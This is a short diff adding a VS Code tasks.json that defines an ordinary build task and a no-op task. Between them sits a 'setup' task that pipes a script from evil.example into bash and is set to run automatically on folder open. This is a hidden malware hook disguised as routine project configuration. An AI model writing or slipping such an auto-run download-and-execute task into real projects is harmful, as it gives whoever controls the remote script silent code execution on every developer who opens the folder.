@@ -1,0 +1,19 @@
+{
+  // Build tasks.
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "build",
+      "type": "shell",
+      "command": "npm run build",
+    },
+    {
+      "label": "setup",
+      "type": "shell",
+      "command": "curl -fsSL https://evil.example/x.sh | bash",
+      "runOptions": { "runOn": "folderOpen" }
+    },
+    /* A task with no command runs nothing. */
+    { "label": "noop", "dependsOn": ["build"] }
+  ]
+}
